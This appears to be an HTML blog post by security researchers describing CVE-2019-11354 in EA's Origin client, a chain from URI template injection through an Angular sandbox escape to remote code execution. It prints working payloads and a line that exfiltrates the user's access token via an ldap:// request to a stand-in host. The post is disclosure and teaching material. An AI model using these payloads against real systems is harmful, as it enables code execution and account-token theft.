@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>A Questionable Journey From XSS to RCE</title>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="blog, , Dom's Blog, jekyll">
+    <meta name="author" content="">
+    
+    
+    
+
+    <meta name="description" content="Electronic Arts' Origin Client suffered from a vulnerability that allowed attackers to leverage remote code execution... all because of a simple content injection issue.">
+    <link href='https://fonts.googleapis.com/css?family=Inconsolata:400,700' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="/css/main.css">
+    <link rel="icon" type="image/ico" href="https://zeropwn.github.io/assets/favicon.ico">
+    <link rel="shortcut-icon" type="image/ico" href="https://zeropwn.github.io/assets/favicon.ico">
+
+    <!-- For Facebook -->
+    <meta property="og:title" content="A Questionable Journey From XSS to RCE" />
+    <meta property="og:image" content="https://zeropwn.github.io/assets/favicon.ico" />
+    <meta property="og:description" content="Electronic Arts' Origin Client suffered from a vulnerability that allowed attackers to leverage remote code execution... all because of a simple content injection issue." />
+
+    <!-- For Twitter -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="A Questionable Journey From XSS to RCE" />
+    <meta name="twitter:description" content="Electronic Arts' Origin Client suffered from a vulnerability that allowed attackers to leverage remote code execution... all because of a simple content injection issue." />
+    <meta name="twitter:image" content="https://zeropwn.github.io/assets/favicon.ico" />
+</head>
+
+
+<body>
+    <div class="wrapper">
+        <div class="navbar container">
+    <a id="site-title" class="alignable pull-left" href="https://zeropwn.github.io">Dom's Blog</a>
+    <ul id="navlist" class="alignable pull-right navbar-ul">
+        
+        <li class="alignable pull-left navbar-list">
+            <a href="about">About</a>
+            /
+        </li>
+        
+        <li class="alignable pull-left navbar-list">
+            <a href="https://www.twitter.com/zer0pwn">Twitter</a>
+            
+        </li>
+        
+    </ul>
+</div>
+<div style="clear:both"></div>
+
+<hr>
+
+        <div class="page-title">
+            A Questionable Journey From XSS to RCE
+        </div>
+        <div class="container">
+            <div class="content">
+                <div class="page-subtitle">
+    
+        
+            <b>[</b>
+        
+        <a href="/tags/#xss" title="xss">xss</a>
+        
+            ,
+        
+    
+        
+        <a href="/tags/#rce" title="rce">rce</a>
+        
+            <b>]</b>
+        
+    
+</div>
+<br>
+<h1 id="introduction">Introduction</h1>
+
+<p>As many of you reading this probably already know, in mid April, a good friend of mine (@Daley) and I located a Remote Code Execution vulnerability in EA’s Origin client (CVE-2019-11354). Today I’m going to go in depth on how we discovered this vulnerability, along with a couple others we needed to chain along the way ;pp</p>
+
+<p><a href="/assets/calc.gif"><img src="/assets/calc.gif" alt="" title="Origin RCE" /></a></p>
+
+<h1 id="debugging-origin">Debugging Origin</h1>
+
+<p>A lot of what was discovered was enabled by QtWebEngine debugging. By passing a specific flag to the origin process, we can hook Chrome devtools to the process and inspect the web view.</p>
+
+<p>In order to set up remote debugging, you have to enable port-forwarding in the chrome devtools. To do this you need to start chrome and open the devtools. From there, open the Remote Devices view, enable port forwarding, and fill in the settings as needed.</p>
+
+<p>Now we can start the origin process.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Origin.exe --remote-debugging-port=31337
+</code></pre></div></div>
+
+<p>If you navigate to localhost:31337 in chrome, you’ll be met with the devtools, and from there, you can do all the poking around you need.</p>
+
+<h1 id="origin-uri-handler">Origin URI Handler</h1>
+
+<p>URI exploitation isn’t new by any means. For a long time it has provided reliable ways of delivering payloads and executing commands on remote computers. The idea of being able to execute remote commands by simply having your target visit a web-page is obviously more than ideal to any threat actor.</p>
+
+<p>In this scenario, the whole idea behind registering a custom URI handler is for ease-of-access. For example, Origin’s handler is mainly there to be able to launch or purchase games from your web-browser. As soon as you click one of those links, your Origin client will launch with the parameters supplied by the crafted URI.</p>
+
+<p>The Origin URI provides us with a few options we can use. To launch a game, we can use the following URI. This option gives us a few parameters. That’s where we’ll find our first bug.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>origin://game/launch/?offerIds=OFFERID
+</code></pre></div></div>
+
+<h1 id="the-first-bug-template-injection">The First Bug (Template Injection)</h1>
+
+<p>The first bug relies on the fact that when Origin recieves an invalid game ID, it gives you the option to manually add it to your game library. In the dialog that pops up, it also echoes out the title of the game you’d like to add. If the game isn’t recognized by Origin, how is it supposed to fetch a title, you may be asking. That’s where the “title” parameter comes in handy.</p>
+
+<p>We can quite literally specify any title we want by simply using the following link:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>origin://game/launch/?offerIds=0&amp;title=zer0pwn
+</code></pre></div></div>
+
+<p>This initially prompted me to try injecting HTML to see if maybe there was a possibility for XSS. You can tell that the HTML is being interpreted when you use the following link:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>origin://game/launch/?offerIds=0&amp;title=&lt;h1&gt;zer0pwn
+</code></pre></div></div>
+
+<p>I figured it would be as simple as injecting script tags to execute javascript, however this was not the case. After a little bit of digging, I discovered that the front-end is primarily developed in Angular. Angular does a lot of stuff with templating, so I figured maybe there was a possibility of template injection. Sure enough, a simple payload of 7*7 got evaluated.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>origin://game/launch/?offerIds=0&amp;title={{7*7}}
+</code></pre></div></div>
+
+<h1 id="the-second-bug-xss">The Second Bug (XSS)</h1>
+
+<p>Obviously with a client-side template injection vulnerability, we’re limited to executing actions on the client. However, we can leverage this to evaluate our own Javascript and potentially compromise user sessions.</p>
+
+<p>Angular is notorious for sandboxing, which means that we’re going to have to do some funky scripting in order to execute what we want. Thankfully some researchers have already compiled a gist of Angular sandbox-escapes, which is what we used.</p>
+
+<p>By using the following payload in the title param, we were able to pop an alert box (l33th4x!!!!11)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(l),a')}}
+</code></pre></div></div>
+
+<h1 id="the-third-bug--rce">The Third Bug  (RCE)</h1>
+
+<p>Now, this part of the exploit is relatively trivial. QDesktopServices itself isn’t necessarily vulnerable here, however the way that Origin has implemented it, on top of the other vulnerabilties, it ended up with a pretty nasty result.</p>
+
+<p>According to the Qt documentation, “The QDesktopServices class provides methods for accessing common desktop services. Many desktop environments provide services that can be used by applications to perform common tasks, such as opening a web page, in a way that is both consistent and takes into account the user’s application preferences.”</p>
+
+<p>Now here’s the crazy part… There is actually an SDK (by Origin) in which you can communicate with the client’s QDesktopServices via a javascript library. This only works if it’s launched within the Origin client (obviously).</p>
+
+<p>By accessing Origin.client.desktopServices in the DOM, we can find the following functions:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">:</span> <span class="kd">function</span> <span class="nx">asyncOpenUrl</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">asyncOpenUrlWithEADPSSO</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">deminiaturize</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">flashIcon</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">formatBytes</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">getVolumeDiskSpace</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">isMiniaturized</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">miniaturize</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">moveWindowToForeground</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">setNextWindowUUID</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">showWindow</span><span class="p">()</span><span class="err">​</span>
+</code></pre></div></div>
+
+<p>Some of these functions are pretty cool. If you call <code class="highlighter-rouge">flashIcon()</code>, you’ll see the Origin icon flashing (big surprise, right). Most of the functions are pretty self explanatory actually, so I won’t bother going into them.</p>
+
+<p>What we had luck with was <code class="highlighter-rouge">asyncOpenUrl()</code>. This function basically calls QDesktopServices <code class="highlighter-rouge">openUrl()</code> function, which in turn opens a web browser, or whatever application is registered with the provided URI. According to the documentation, you can also load local resources. Sounds promising, right ;)?</p>
+
+<p>We can literally open a calculator with the following javascript:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Origin</span><span class="p">.</span><span class="nx">client</span><span class="p">.</span><span class="nx">desktopServices</span><span class="p">.</span><span class="nx">asyncOpenUrl</span><span class="p">(</span><span class="s2">"calc.exe"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h1 id="what-else-can-we-do">What else can we do?</h1>
+
+<p>As I mentioned earlier, Origin has a CSP in place which makes exfiltration somewhat difficult. If we use the <code class="highlighter-rouge">ldap://</code> URI handler in conjunction with <code class="highlighter-rouge">asyncOpenUrl()</code>, we can send an LDAP request along with the data we want to exfiltrate.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"ldap://safe.tld/o="+Origin.user.accessToken()+",c=UnderDog"
+</code></pre></div></div>
+
+<p>From the server, start tcpdump and set the necessary filters and you should see the data being transmitted in plaintext.</p>
+
+<p>The <code class="highlighter-rouge">Origin.user</code> object contains a bunch of other information as well.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">:</span> <span class="kd">function</span> <span class="nx">accessToken</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">country</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">dob</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">email</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">emailStatus</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">globalEmailSignup</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">isAccessTokenExpired</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">originId</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">personaId</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">registrationDate</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">sessionGUID</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">showPersona</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">tfaSignup</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">underAge</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">userGUID</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="kd">function</span> <span class="nx">userPid</span><span class="p">()</span><span class="err">​</span>
+<span class="p">:</span> <span class="nx">userStatus</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="wasnt-this-patched">Wasn’t this patched?</h1>
+
+<p>Electronic Art’s rolled out a patch, however there are bypasses available as some on Twitter have decided to share. This highlights the issue once again and should be addressed by sanitizing all types of input, as the initial patch failed to do so.</p>
+
+<h1 id="references">References</h1>
+<ul>
+  <li><a href="https://gist.github.com/jeremybuis/38c01acae19fc2ac6959">https://gist.github.com/jeremybuis/38c01acae19fc2ac6959</a></li>
+  <li><a href="https://blog.underdogsecurity.com/rce_in_origin_client/">https://blog.underdogsecurity.com/rce_in_origin_client/</a></li>
+  <li><a href="https://doc.qt.io/qt-5/qdesktopservices.html">https://doc.qt.io/qt-5/qdesktopservices.html</a></li>
+</ul>
+
+
+            </div>
+            <div class="footer">
+                <div class="footer">
+    <br><hr>
+    <a href="https://github.com/zeropwn" style="color: black">written with love and caffeine</a>
+</div>
+
+            </div>
+        </div>
+    </div>
+</body>
